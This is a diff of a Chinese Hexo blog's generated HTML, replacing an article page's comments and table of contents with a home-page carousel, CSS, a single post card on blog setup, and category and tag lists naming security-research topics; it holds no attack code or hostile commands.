+  var effect = 'slide';
+  var swiperLength = parseInt(document.querySelector(".swiper-length").innerText);
+  var defaultDesc = '上邪！我欲与君相知，长命无绝衰,天无棱，山水为竭，冬雷震震，夏雨雪，天地合,乃敢与君绝';
+  defaultDesc = defaultDesc.split(',');
+  var defaultDescTypedLoop = JSON.parse('true');
   var vm = new Vue({
-    el: '#appDonate',
+    el: '#appSwiper',
     data: {
-      visible: false,
-      tabActive: 'Alipay',
-      top: 0,
+      defaultDesc: defaultDesc,
+      defaultDescTypedLoop,
+      swiperOptions: {
+        pagination: {
+          el: '.swiper-pagination',
+          clickable: true // 允许点击小圆点跳转
+        },
+        loop: loop ? true : false,
+        effect, // fade
+        autoplay: (autoplay && swiperLength > 1) ? {
+  　　　　delay,
+  　　　　disableOnInteraction: false // 手动切换之后继续自动轮播
+    　　} : false,
+        navigation: {
+          nextEl: '.swiper-button-next',
+          prevEl: '.swiper-button-prev',
+        },
+        lazy: {
+          loadPrevNext: true,
+        },
+        on:{
+          init: function() {
+            swiperAnimateCache(this); //隐藏动画元素 
+            swiperAnimate(this); //初始化完成开始动画
+          }, 
+          slideChangeTransitionEnd: function(){ 
+            swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          } 
+        }
+        // Some Swiper option/callback...
+      }
     },
     computed: {
+      swiper() {
+        return this.$refs.mySwiper.$swiper
+      }
     },
     mounted() {
+      // console.log('Current Swiper instance object', this.swiper)
+      // this.swiper.slideTo(0, 1000, false)
     },
     methods: {
-      showDialogDrawer() {
-        this.visible = true;
-        // 防止页面滚动，只能让弹框滚动
-        // function getScroll() {
-        //   return {
-        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
-        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
-        //   };
-        // }
-        this.top = $(document).scrollTop() // or getScroll().top
-        // console.log('aa', $('.main-content'));
-        body.style.cssText = 'overflow: hidden;';
+      stopAutoPlay() {
+        (autoplay && swiperLength > 1) && this.swiper.autoplay.stop();
       },
-      cancelDialogDrawer() {
-        this.visible = false;
-        body.removeAttribute('style');
-        $(document).scrollTop(this.top)
+      startAutoPlay() {
+        (autoplay && swiperLength > 1) && this.swiper.autoplay.start();
       },
-      changeTabActive(name) {
-        this.tabActive = name;
+      slideChangeTransitionEnd() {
+        console.log('1');
+      },
+      toPostContent() {
+        const fullHeight = $(window).height() - 60;
+        $('html,body').animate({scrollTop: fullHeight},500);
       }
     },
     created() {}
   })
 </script>
-    
 
-    <!-- 分享 -->
-    
-      <!-- https://github.com/overtrue/share.js -->
-<!-- 文章详情页的分享 -->
-<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-
-<script src="/js/shareJs/social-share.min.js"></script>
-</script>
+  <script src="/js/bubble/homeBubble.js"></script>
 
 <style>
-  .social-share {
-    margin: 20px 0;
+#appSwiper {
+  position: relative;
+  user-select: none;
+  overflow: hidden;
+  font-family: Titillium Web,'PingFang SC','Hiragino Sans GB','Microsoft JhengHei','Microsoft YaHei',sans-serif;
+}
+.default-excerpt {
+  font-size: 1.6em;
+  margin-top: 1em;
+  color: #eee;
+}
+.bottom-one-btn {
+  margin-top: 15px;
+}
+.swiper-container {
+  overflow: hidden;
+  z-index: 0;
+}
+.swiper-slide {
+  height: 350px;
+  position: relative;
+}
+.swiper-button-prev,
+.swiper-button-next {
+  padding: 10px 10px;
+  transition: background 0.2s;
+}
+.swiper-button-prev:hover,
+.swiper-button-next:hover {
+  background: rgba(0, 0, 0, 0.2);
+}
+.swiper-slide .item {
+  width: 100%;
+  height: 100%;
+}
+.flag {
+  position: relative;
+  width: 70%;
+  margin: 0 auto;
+  color: #ffffff;
+  height: 100%;
+  background: #000;
+}
+.flag img {
+  min-height: 100%;
+}
+.flag-text {
+  position: absolute;
+  top: 50px;
+  left: 50px;
+  width: 80%;
+  height: 280px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  z-index: 9999;
+}
+.flag-text .title {
+  font-size: 1.8em;
+}
+.flag-text .title a {
+  color: #fff;
+  transition: color 0.3s;
+}
+.flag-text .title a:hover {
+  color: rgba(66, 185, 133, 0.8);
+}
+.flag-text .excerpt {
+  color: #eee;
+  width: 70%;
+  line-height: 30px;
+  height: 150px;
+  margin-top: 2%;
+  display: -webkit-box;
+  -webkit-box-orient: vertical;
+  -webkit-line-clamp: 5;
+  overflow: hidden;
+}
+.swiper-pagination-bullet-active {
+  opacity: 1;
+  background-color: #42b983;
+}
+.img-mask {
+  opacity:0.6; filter: alpha(opacity=60);
+}
+.flag-text .read-more {
+  margin-bottom: 30px;
+  padding: 5px 15px;
+  color: #ffffff;
+  border-radius: 20px;
+}
+#scroll-down {
+  position: absolute;
+  bottom: 10px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 2.5em;
+  color: #fff;
+  cursor: pointer;
+  z-index: 2;
+}
+#scroll-down a {
+  color: #fff;
+}
+@-webkit-keyframes rightan
+  {
+  
+  0%
+  {
+    transform: translateY(0);
+    opacity: 0.5;
   }
+  50% {
+    transform: translateY(-30px);
+    opacity: 1;
+  }
+  100%
+  {
+    transform: translateY(0);
+    opacity: 0.5;
+  }
+}
+.scroll-down-effects {
+  animation: rightan 1.5s infinite;
+}
+/* 当头部导航设置为背景透明的时候 */
+.swiper-slide {
+  height: 400px;
+}
+.flag-text {
+  top: 80px;
+}
+
+@media (min-width: 992px) {
+  .swiper-button-prev {
+    margin-left: 15%;
+    transform: translateX(-180%);
+  }
+  .swiper-button-next {
+    margin-right: 15%;
+    transform: translateX(180%);
+  }
+  .flag-text .title {
+    width: 80%;
+    line-height: 35px;
+    max-height: 70px;
+    display: -webkit-box;
+    -webkit-box-orient: vertical;
+    -webkit-line-clamp: 2;
+    overflow: hidden;
+  }
+}
+@media screen and (max-width: 1200px) { 
+  .flag {
+    width: 80%;
+  }
+  .swiper-button-prev {
+    margin-left: 10%;
+    transform: translateX(-180%);
+  }
+  .swiper-button-next {
+    margin-right: 10%;
+    transform: translateX(180%);
+  }
+}
+@media (max-width: 992px) {
+  .flag {
+    width: 100%;
+  }
+  .flag-text .title {
+    font-size: 1.5em;
+    margin-top: 50px;
+    display: -webkit-box;
+    -webkit-box-orient: vertical;
+    -webkit-line-clamp: 2;
+    overflow: hidden;
+  }
+  .flag-text {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 80%;
+    height: 100%;
+    margin-left: 50%;
+    transform: translateX(-50%);
+  }
+  .flag-text .excerpt {
+    width: 100%;
+    line-height: 25px;
+    height: 125px;
+    display: -webkit-box;
+    -webkit-box-orient: vertical;
+    -webkit-line-clamp: 5;
+    overflow: hidden;
+  }
+  .flag-text .read-more {
+    margin-bottom: 80px;
+  }
+}
+@media (max-width: 992px) and (min-width: 551px) {
+  .flag-text .excerpt {
+    width: 70%;
+  }
+}
+@media (max-width: 551px) {
+  .swiper-slide {
+    height: 250px;
+  }
+  .flag-text .title {
+    line-height: 30px;
+    max-height: 60px;
+    display: -webkit-box;
+    -webkit-box-orient: vertical;
+    -webkit-line-clamp: 2;
+    overflow: hidden;
+    margin-top: 20px;
+  }
+  .flag-text .excerpt {
+    font-size: 1em;
+    line-height: 20px;
+    height: 80px;
+    display: -webkit-box;
+    -webkit-box-orient: vertical;
+    -webkit-line-clamp: 4;
+  }
+  .flag-text .excerpt { 
+    margin-top: 10px;
+  }
+  .flag-text .read-more {
+    margin-top: 10px;
+    margin-bottom: 50px;
+  }
+  .swiper-button-prev,
+  .swiper-button-next {
+    transform: scale(0.5);
+  }
+  .swiper-button-prev {
+    left: 0;
+  }
+  .swiper-button-next {
+    right: 0;
+  }
+}
+/* 当头部导航设置为背景透明的时候 */
+  @media (max-width: 992px) {
+    .flag-text {
+      top: 60px;
+      height: 80%;
+    }
+  }
+  @media (max-width: 551px) {
+    .swiper-slide {
+      height: 310px;
+    }
+  }
+
+/* 文字或者按钮居中显示 */
+
+  .flag-text {
+    left: 10%;
+  }
+  .flag-text .flag-text-content {
+    width: 100%;
+    text-align: center;
+  }
+  .flag-text .title {
+    width: 100%;
+    text-align: center;
+  }
+  .flag-text .excerpt { 
+    width: 100%;
+    text-align: center;
+  }
+  .bottom-one-btn {
+    display: flex;
+    justify-content: center;
+  }
+  .default-excerpt {
+    display: flex;
+    justify-content: center;
+    font-size: 1.6em;
+  }
+  .flag-text-btns {
+    justify-content: center;
+  }
+  @media (min-width: 992px) {
+    .flag-text .excerpt {
+      line-height: 30px;
+      display: -webkit-box;
+      -webkit-box-orient: vertical;
+      -webkit-line-clamp: 5;
+      overflow: hidden;
+    }
+  }
+  @media (max-width: 992px) {
+    .flag-text {
+      margin-left: 0;
+      transform: translateX(0);
+    }
+  }
+
+
+
+
+/* 全屏显示 */
+
+  .flag {
+    width: 100%;
+  }
+  .swiper-slide {
+    height: 100vh;
+  }
+  .flag-text {
+    top: 50%;
+    left: 15%;
+    transform: translateY(-50%);
+    width: 70%;
+    height: auto;
+  }
+  .flag-text .title {
+    font-size: 2.8em;
+    line-height: 1.5em;
+    max-height: none;
+  }
+  .flag-text .excerpt {
+    font-size: 1.25em;
+    height: 150px;
+  }
+  .flag-text .read-more {
+    margin-top: 10px;
+  }
+  .swiper-button-prev,
+  .swiper-button-next {
+    margin-top: -60px!important;
+  }
+  .swiper-btn-color,
+  .swiper-btn-color2 {
+    background-color: transparent;
+    border: 1px solid #fff;
+  }
+  .swiper-btn-color:hover,
+  .swiper-btn-color2:hover {
+    background-color: rgba(66, 185, 133, 0.8);
+    border: 1px solid rgba(66, 185, 133, 0.8)!important;
+  }
+  .flag-text-btns {
+    justify-content: center;
+  }
+  .swiper-button-prev {
+    margin-left: 10px;
+    transform: translateX(0);
+    border-radius: 50%;
+    padding: 0;
+    width: 50px;
+    height: 50px;
+  }
+  .swiper-button-next {
+    margin-right: 10px;
+    transform: translateX(0);
+    border-radius: 50%;
+    padding: 0;
+    width: 50px;
+    height: 50px;
+  }
+  .swiper-button-next:after, .swiper-button-prev:after {
+    font-size: 1.2em;
+  }
+  @media (min-width: 992px) {
+    .flag-text .excerpt {
+      line-height: 35px;
+      height: 175px;
+    }
+    .default-excerpt {
+      min-height: 150px;
+    }
+    .typed-element {
+      align-items: unset;
+    }
+  }
+  @media (max-width: 992px) {
+    .flag-text {
+      margin-left: 0;
+      height: 60%;
+      top: 55%;
+    }
+    .flag-text .title {
+      font-size: 2.4em;
+      margin-top: 0;
+      display: -webkit-box;
+      -webkit-box-orient: vertical;
+      -webkit-line-clamp: 2;
+      overflow: hidden;
+    }
+    .flag-text .excerpt {
+      line-height: 35px;
+      height: 185px;
+    }
+    .flag-text .read-more {
+      margin-top: 20px;
+    }
+  }
+  @media (max-width: 551px) {
+    .flag-text {
+      height: 60%;
+    }
+    .flag-text .title {
+      font-size: 2.2em;
+    }
+    .flag-text .excerpt {
+      line-height: 30px;
+    }
+    .flag-text .read-more {
+      margin-top: 50px;
+      padding: 10px 30px;
+    }
+    .swiper-button-prev {
+      margin-left: 0;
+    }
+    .swiper-button-next {
+      margin-right: 0;
+    }
+    .default-excerpt {
+      margin-top: 1em;
+    }
+  }
+
+
+/* video */
+.swiper-video {
+  width: 100%;
+  height: 100%;
+}
+.swiper-video video {
+  pointer-events: none;
+}
+.swiper-video-maskBox{
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 100%;
+  width: 100%;
+  background-color: #000;
+  opacity: 0.2;
+  z-index: 1;
+}
+@media (min-width: 992px) {
+  
+    .swiper-video {
+      display: none;
+    }
+    .swiper-default-bgImg {
+      display: block;  
+    }
+  
+}
+@media (max-width: 992px) {
+  .swiper-video {
+    display: none;
+  }
+  .swiper-default-bgImg {
+    display: block;  
+  }
+}
+/* video-end */
 </style>
 
 
+<div id="l_main">
+  <div class="l_content">
+    <!-- 自定义的内容 -->
     
+    <!-- 首页座右铭 -->
     
-    <!-- 评论 -->
-    <!-- 评论 -->
+    <!-- 首页公告 -->
+    
+    <!-- 首页文章置顶 -->
+    
 
-  <div id="myComment">
-    
-      <div id="gitment-container"></div>
 
+
+    <div class="bg-floor" id="home-bg-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
+    <!-- 每一篇文章卡片 -->
+    <!-- hash算法 -->
+
+<section class="posts">
+  
+    
+    <article class="post reveal" style="flex-direction: row-reverse;   ">
+      <div class="post-main">
+        <div class="post-info">
+          <div class="post-time">
+            <i class="fas fa-clock" aria-hidden="true"></i>
+            <span class="post-time">2021-11-28</span>
+          </div>
+          <div class="post-title">
+            <a class="post-title-link" href="/2021/11/28/hexo-bo-ke-da-jian/">Hexo博客搭建</a>
+          </div>
+          <div class="post-meta">
+            <div class="post-tags">
+              <!-- 文章详情页的标签 -->
+
+    <i class="iconfont icontag"></i>
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
+
+            </div>
+            <div class="post-categories">
+              <!-- 文章详情页的分类 -->
+
+<div class="article-category">
+  <i class="iconfont iconbookmark1"></i>
+  <a class="article-category-link" href="/categories/Hexo/">Hexo</a>
+</div>
+
+
+            </div>
+          </div>
+          <div class="post-img-mobile">
+            <a href="/2021/11/28/hexo-bo-ke-da-jian/" style="background-size: cover; 
+              background-position: center center;">
+              <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B870.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B870.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+            </a>
+          </div>
+          <div class="post-content">
+            去掉图片图注正则表达式：!\[[^\]]*\],上次处理到springAOP链
+Problem
+hexo d老是卡住：git config --global http.proxy &#39;socks5://127.0.0.1:10086&
+          </div>
+        </div>
+        <div class="post-more">
+          <a href="/2021/11/28/hexo-bo-ke-da-jian/">
+            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
+          </a>
+        </div>
+      </div>
+      <div class="post-img">
+        <a href="/2021/11/28/hexo-bo-ke-da-jian/" style="background-size: cover; 
+          background-position: center center;">
+          <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B870.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B870.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+        </a>
+      </div>
+    </article>
+  
+</section>
+    <!-- 翻页 -->
+    
+  <!-- <nav class="page-nav">
+    <a class="extend prev" rel="prev" href="/page/8/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span>
+  </nav> -->
+  <div class="page-nav">
+    
+      <a href="/page/8/"
+         class="page-nav-pre">
+         <i class="fas fa-angle-left"></i><span class="ml-5">上一页</span>
+      </a>
+    
+    <div class="page-info">
+        <div class="page-info-text">9 / 9</div>
+    </div>
     
   </div>
 
-<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
-
-
   </div>
 
-  <!-- 目录 -->
   <aside id='l_side'>
   
     
@@ -1066,29 +1375,173 @@
   <div class="layout_sticky">    
     
       
-<section class="widget side_toc">
-  
+        
+    <section class="widget side_category">
+      
   <header>
     
-      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+      <a style="color: " href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
     
   </header>
 
 
-  <div class='content'>
-    <div class="toc-main">
-      <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BANode1"><span class="toc-text">vulnhub靶机Node1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9C%89%E6%95%88%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86"><span class="toc-text">一、有效资产收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-text">二、渗透测试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">1. 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B6%8A%E6%9D%83"><span class="toc-text">2. 越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%88%86%E7%A0%B4%E8%A7%A3%E5%8E%8B%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">3. 爆破解压压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ssh%E7%99%BB%E5%BD%95"><span class="toc-text">4. ssh登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-ubuntu16-04%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-text">5. ubuntu16.04内核提权</span></a></li></ol></li></ol></li></ol> -->
-        <div class="toc"></div>
+      <div class='content'>
+        <ul class="entry navigation">
+          
+            <li><a class="flat-box"
+              title="/categories/Hexo/" href="/categories/Hexo/"
+              id="categoriesHexo"
+              ><div class='name'>Hexo</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/ctf/" href="/categories/ctf/"
+              id="categoriesctf"
+              ><div class='name'>ctf</div><div class='badge'>(9)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/ctf/WP/" href="/categories/ctf/WP/"
+              id="categoriesctfWP"
+              ><div class='name'>WP</div><div class='badge'>(8)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/java/" href="/categories/java/"
+              id="categoriesjava"
+              ><div class='name'>java</div><div class='badge'>(77)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/CC/" href="/categories/java/CC/"
+              id="categoriesjavaCC"
+              ><div class='name'>CC</div><div class='badge'>(10)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/RASP/" href="/categories/java/RASP/"
+              id="categoriesjavaRASP"
+              ><div class='name'>RASP</div><div class='badge'>(3)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/RMI/" href="/categories/java/RMI/"
+              id="categoriesjavaRMI"
+              ><div class='name'>RMI</div><div class='badge'>(3)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/SSTI/" href="/categories/java/SSTI/"
+              id="categoriesjavaSSTI"
+              ><div class='name'>SSTI</div><div class='badge'>(2)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/java%E6%9D%82%E8%B0%88/" href="/categories/java/java%E6%9D%82%E8%B0%88/"
+              id="categoriesjavajavaE69D82E8B088"
+              ><div class='name'>java杂谈</div><div class='badge'>(13)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/other%E6%BC%8F%E6%B4%9E/" href="/categories/java/other%E6%BC%8F%E6%B4%9E/"
+              id="categoriesjavaotherE6BC8FE6B49E"
+              ><div class='name'>other漏洞</div><div class='badge'>(7)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/%E5%86%85%E5%AD%98%E9%A9%AC/" href="/categories/java/%E5%86%85%E5%AD%98%E9%A9%AC/"
+              id="categoriesjavaE58685E5AD98E9A9AC"
+              ><div class='name'>内存马</div><div class='badge'>(11)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/java/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" href="/categories/java/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"
+              id="categoriesjavaE6A186E69EB6E6BC8FE6B49E"
+              ><div class='name'>框架漏洞</div><div class='badge'>(28)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/nodejs/" href="/categories/nodejs/"
+              id="categoriesnodejs"
+              ><div class='name'>nodejs</div><div class='badge'>(2)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/python/" href="/categories/python/"
+              id="categoriespython"
+              ><div class='name'>python</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/%E4%BF%9D%E5%AF%86%E5%B7%A5%E4%BD%9C/" href="/categories/%E4%BF%9D%E5%AF%86%E5%B7%A5%E4%BD%9C/"
+              id="categoriesE4BF9DE5AF86E5B7A5E4BD9C"
+              ><div class='name'>保密工作</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/" href="/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"
+              id="categoriesE5AE89E58D93E98086E59091"
+              ><div class='name'>安卓逆向</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/" href="/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"
+              id="categoriesE69D82E4B883E69D82E585AB"
+              ><div class='name'>杂七杂八</div><div class='badge'>(6)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/%E6%B8%97%E9%80%8F/" href="/categories/%E6%B8%97%E9%80%8F/"
+              id="categoriesE6B897E9808F"
+              ><div class='name'>渗透</div><div class='badge'>(20)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/%E6%B8%97%E9%80%8F/HTB/" href="/categories/%E6%B8%97%E9%80%8F/HTB/"
+              id="categoriesE6B897E9808FHTB"
+              ><div class='name'>HTB</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/%E6%B8%97%E9%80%8F/vulnhub/" href="/categories/%E6%B8%97%E9%80%8F/vulnhub/"
+              id="categoriesE6B897E9808Fvulnhub"
+              ><div class='name'>vulnhub</div><div class='badge'>(4)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" href="/categories/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"
+              id="categoriesE6B897E9808FE698A5E7A78BE4BA91E9959C"
+              ><div class='name'>春秋云镜</div><div class='badge'>(13)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" href="/categories/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"
+              id="categoriesE6B897E9808FE6B897E9808FE7AC94E8AEB0"
+              ><div class='name'>渗透笔记</div><div class='badge'>(2)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/%E7%AE%97%E6%B3%95/" href="/categories/%E7%AE%97%E6%B3%95/"
+              id="categoriesE7AE97E6B395"
+              ><div class='name'>算法</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box"
+              title="/categories/%E8%93%9D%E9%98%9F/" href="/categories/%E8%93%9D%E9%98%9F/"
+              id="categoriesE8939DE9989F"
+              ><div class='name'>蓝队</div><div class='badge'>(2)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/%E8%93%9D%E9%98%9F/hw%E6%97%A5%E8%AE%B0/" href="/categories/%E8%93%9D%E9%98%9F/hw%E6%97%A5%E8%AE%B0/"
+              id="categoriesE8939DE9989FhwE697A5E8AEB0"
+              ><div class='name'>hw日记</div><div class='badge'>(1)</div></a></li>
+          
+            <li><a class="flat-box child"
+              title="/categories/%E8%93%9D%E9%98%9F/%E6%BA%AF%E6%BA%90/" href="/categories/%E8%93%9D%E9%98%9F/%E6%BA%AF%E6%BA%90/"
+              id="categoriesE8939DE9989FE6BAAFE6BA90"
+              ><div class='name'>溯源</div><div class='badge'>(1)</div></a></li>
+          
+        </ul>
       </div>
-    </div>
-  </div>
-</section>
-<!-- 手机端目录按钮 -->
-<div id="toc-mobile-btn">
-  <i class="fas fa-list-ul" aria-hidden="true"></i>
-</div>
+    </section>
+  
+  
+      
+      
+        
+<section class="widget side_tagcloud">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
+    
+  </header>
 
+
+    <div class='content'>
+    <a href="/tags/AspectJWeaver/" style="font-size: 14px; color: #999">AspectJWeaver</a> <a href="/tags/BCEL/" style="font-size: 15.25px; color: #919191">BCEL</a> <a href="/tags/C/" style="font-size: 14px; color: #999">C++</a> <a href="/tags/C3P0/" style="font-size: 14px; color: #999">C3P0</a> <a href="/tags/CC/" style="font-size: 22.75px; color: #5e5e5e">CC</a> <a href="/tags/CTF/" style="font-size: 19px; color: #777">CTF</a> <a href="/tags/CVE/" style="font-size: 15.25px; color: #919191">CVE</a> <a href="/tags/Freemarker/" style="font-size: 14px; color: #999">Freemarker</a> <a href="/tags/Groovy/" style="font-size: 14px; color: #999">Groovy</a> <a href="/tags/HTB/" style="font-size: 14px; color: #999">HTB</a> <a href="/tags/JDBC/" style="font-size: 15.25px; color: #919191">JDBC</a> <a href="/tags/JNDI/" style="font-size: 17.75px; color: #808080">JNDI</a> <a href="/tags/RASP/" style="font-size: 17.75px; color: #808080">RASP</a> <a href="/tags/ROME/" style="font-size: 14px; color: #999">ROME</a> <a href="/tags/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" style="font-size: 15.25px; color: #919191">SPEL表达式注入</a> <a href="/tags/Shiro/" style="font-size: 16.5px; color: #888">Shiro</a> <a href="/tags/SnakYaml/" style="font-size: 14px; color: #999">SnakYaml</a> <a href="/tags/SnakeYaml/" style="font-size: 14px; color: #999">SnakeYaml</a> <a href="/tags/Spring/" style="font-size: 16.5px; color: #888">Spring</a> <a href="/tags/Thymeleaf/" style="font-size: 14px; color: #999">Thymeleaf</a> <a href="/tags/Tomcat/" style="font-size: 21.5px; color: #666">Tomcat</a> <a href="/tags/WP/" style="font-size: 14px; color: #999">WP</a> <a href="/tags/XStream/" style="font-size: 14px; color: #999">XStream</a> <a href="/tags/aircrack-ng/" style="font-size: 14px; color: #999">aircrack-ng</a> <a href="/tags/apache-Dubbo/" style="font-size: 14px; color: #999">apache Dubbo</a> <a href="/tags/codeql/" style="font-size: 14px; color: #999">codeql</a> <a href="/tags/fastjson/" style="font-size: 20.25px; color: #6f6f6f">fastjson</a> <a href="/tags/go-ssti/" style="font-size: 14px; color: #999">go ssti</a> <a href="/tags/golang/" style="font-size: 14px; color: #999">golang</a> <a href="/tags/hexo/" style="font-size: 14px; color: #999">hexo</a> <a href="/tags/hw/" style="font-size: 14px; color: #999">hw</a> <a href="/tags/jackson/" style="font-size: 16.5px; color: #888">jackson</a> <a href="/tags/java%E5%8E%9F%E7%94%9FRCE/" style="font-size: 16.5px; color: #888">java原生RCE</a> <a href="/tags/java%E6%9D%82%E8%AE%BA/" style="font-size: 15.25px; color: #919191">java杂论</a> <a href="/tags/jdk-17/" style="font-size: 14px; color: #999">jdk 17</a> <a href="/tags/log4j/" style="font-size: 14px; color: #999">log4j</a> <a href="/tags/marshalsec/" style="font-size: 14px; color: #999">marshalsec</a> <a href="/tags/mobile/" style="font-size: 14px; color: #999">mobile</a> <a href="/tags/nodejs/" style="font-size: 15.25px; color: #919191">nodejs</a> <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14px; color: #999">python反序列化</a> <a href="/tags/resin/" style="font-size: 14px; color: #999">resin</a> <a href="/tags/shiroCommonBeanutils/" style="font-size: 14px; color: #999">shiroCommonBeanutils</a> <a href="/tags/spring/" style="font-size: 15.25px; color: #919191">spring</a> <a href="/tags/spring-CGW/" style="font-size: 15.25px; color: #919191">spring CGW</a> <a href="/tags/springAOP/" style="font-size: 14px; color: #999">springAOP</a> <a href="/tags/struct2/" style="font-size: 14px; color: #999">struct2</a> <a href="/tags/tabby/" style="font-size: 14px; color: #999">tabby</a> <a href="/tags/vulnhub/" style="font-size: 17.75px; color: #808080">vulnhub</a> <a href="/tags/weblogic/" style="font-size: 14px; color: #999">weblogic</a> <a href="/tags/ysoserial/" style="font-size: 14px; color: #999">ysoserial</a> <a href="/tags/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14px; color: #999">二次反序列化</a> <a 